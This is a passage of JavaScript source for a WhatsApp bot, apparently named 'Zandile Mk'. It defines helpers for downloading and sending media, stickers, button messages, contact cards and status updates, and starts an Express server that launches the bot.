      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(quoted, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk])
      }
      let type = await FileType.fromBuffer(buffer)
      trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
          // save to file
      await fs.writeFileSync(trueFileName, buffer)
      return trueFileName
    }
    //=================================================
    conn.downloadMediaMessage = async(message) => {
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(message, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk])
      }
    
      return buffer
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} message
    * @param {*} forceForward
    * @param {*} options
    * @returns
    */
    //================================================
    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
                  let mime = '';
                  let res = await axios.head(url)
                  mime = res.headers['content-type']
                  if (mime.split("/")[1] === "gif") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
                  }
                  let type = mime.split("/")[0] + "Message"
                  if (mime === "application/pdf") {
                    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
                  }
                  if (mime.split("/")[0] === "image") {
                    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
                  }
                  if (mime.split("/")[0] === "video") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
                  }
                  if (mime.split("/")[0] === "audio") {
                    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
                  }
                }
    //==========================================================
    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
      //let copy = message.toJSON()
      let mtype = Object.keys(copy.message)[0]
      let isEphemeral = mtype === 'ephemeralMessage'
      if (isEphemeral) {
          mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
      }
      let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
      let content = msg[mtype]
      if (typeof content === 'string') msg[mtype] = text || content
      else if (content.caption) content.caption = text || content.caption
      else if (content.text) content.text = text || content.text
      if (typeof content !== 'string') msg[mtype] = {
          ...content,
          ...options
      }
      if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
      else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
      if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
      else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
      copy.key.remoteJid = jid
      copy.key.fromMe = sender === conn.user.id
    
      return proto.WebMessageInfo.fromObject(copy)
    }
    
    
    /**
    *
    * @param {*} path
    * @returns
    */
    //=====================================================
    conn.getFile = async(PATH, save) => {
      let res
      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
          //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
      let type = await FileType.fromBuffer(data) || {
          mime: 'application/octet-stream',
          ext: '.bin'
      }
      let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
      if (data && save) fs.promises.writeFile(filename, data)
      return {
          res,
          filename,
          size: await getSizeMedia(data),
          ...type,
          data
      }
    
    }
    //=====================================================
    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
      let types = await conn.getFile(PATH, true)
      let { filename, size, ext, mime, data } = types
      let type = '',
          mimetype = mime,
          pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif.js')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
          [type]: { url: pathFile },
          mimetype,
          fileName,
          ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    //=====================================================
    conn.parseMention = async(text) => {
      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
    }
    //=====================================================
    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
      let types = await conn.getFile(path, true)
      let { mime, ext, res, data, filename } = types
      if (res && res.status !== 200 || file.length <= 65536) {
          try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
      }
      let type = '',
          mimetype = mime,
          pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
          [type]: { url: pathFile },
          caption,
          mimetype,
          fileName,
          ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    /**
    *
    * @param {*} message
    * @param {*} filename
    * @param {*} attachExtension
    * @returns
    */
    //=====================================================
    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifVid(buff, options);
      } else {
        buffer = await videoToWebp(buff);
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
    //=====================================================
    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifImg(buff, options);
      } else {
        buffer = await imageToWebp(buff);
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
        /**
         *
         * @param {*} jid
         * @param {*} path
         * @param {*} quoted
         * @param {*} options
         * @returns
         */
    //=====================================================
    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
    
            /**
             *
             * @param {*} jid
             * @param {*} path
             * @param {*} quoted
             * @param {*} options
             * @returns
             */
    //=====================================================
    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
      return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} path
    * @param {*} caption
    * @param {*} quoted
    * @param {*} options
    * @returns
    */
    //=====================================================
    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
    
    /**
     *
     * @param {*} jid
     * @param {*} path
     * @param {*} caption
     * @param {*} quoted
     * @param {*} options
     * @returns
     */
    //=====================================================
    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
      let buttonMessage = {
              text,
              footer,
              buttons,
              headerType: 2,
              ...options
          }
          //========================================================================================================================================
      conn.sendMessage(jid, buttonMessage, { quoted, ...options })
    }
    //=====================================================
    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
      let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
      var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
          templateMessage: {
              hydratedTemplate: {
                  imageMessage: message.imageMessage,
                  "hydratedContentText": text,
                  "hydratedFooterText": footer,
                  "hydratedButtons": but
              }
          }
      }), options)
      conn.relayMessage(jid, template.message, { messageId: template.key.id })
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} buttons
    * @param {*} caption
    * @param {*} footer
    * @param {*} quoted
    * @param {*} options
    */
    //=====================================================
    conn.getName = (jid, withoutContact = false) => {
            id = conn.decodeJid(jid);

            withoutContact = conn.withoutContact || withoutContact;

            let v;

            if (id.endsWith('@g.us'))
                return new Promise(async resolve => {
                    v = store.contacts[id] || {};

                    if (!(v.name.notify || v.subject))
                        v = conn.groupMetadata(id) || {};

                    resolve(
                        v.name ||
                            v.subject ||
                            PhoneNumber(
                                '+' + id.replace('@s.whatsapp.net', ''),
                            ).getNumber('international'),
                    );
                });
            else
                v =
                    id === '0@s.whatsapp.net'
                        ? {
                                id,

                                name: 'WhatsApp',
                          }
                        : id === conn.decodeJid(conn.user.id)
                        ? conn.user
                        : store.contacts[id] || {};

            return (
                (withoutContact ? '' : v.name) ||
                v.subject ||
                v.verifiedName ||
                PhoneNumber(
                    '+' + jid.replace('@s.whatsapp.net', ''),
                ).getNumber('international')
            );
        };

        // Vcard Functionality
        conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
            let list = [];
            for (let i of kon) {
                list.push({
                    displayName: await conn.getName(i + '@s.whatsapp.net'),
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
                        i + '@s.whatsapp.net',
                    )}\nFN:${
                        global.OwnerName
                    }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
                        global.email
                    }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
                        global.github
                    }/zandile-mk\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
                        global.location
                    };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                });
            }
            conn.sendMessage(
                jid,
                {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list,
                    },
                    ...opts,
                },
                { quoted },
            );
        };

        // Status aka brio
        conn.setStatus = status => {
            conn.query({
                tag: 'iq',
                attrs: {
                    to: '@s.whatsapp.net',
                    type: 'set',
                    xmlns: 'status',
                },
                content: [
                    {
                        tag: 'status',
                        attrs: {},
                        content: Buffer.from(status, 'utf-8'),
                    },
                ],
            });
            return status;
        };
    conn.serializeM = mek => sms(conn, mek, store);
  }
/* 
  app.get("/", (req, res) => {
  res.send("Zandile Mk STARTED ✅");
  });
*/
app.use(express.static(path.join(__dirname, 'lib')));

app.get('/', (req, res) => {
    res.redirect('/zandile.html');
});
app.listen(port, () => console.log(chalk.cyan(`
╭──[ 🤖 WELCOME DEAR USER! ]─
│
│ If you enjoy using this bot,
│ please ⭐  Star it & 🍴  Fork it on GitHub!
│ your support keeps it growing! 💙 
╰─────────`)));
setTimeout(() => {
    connectToWA()
}, 4000);
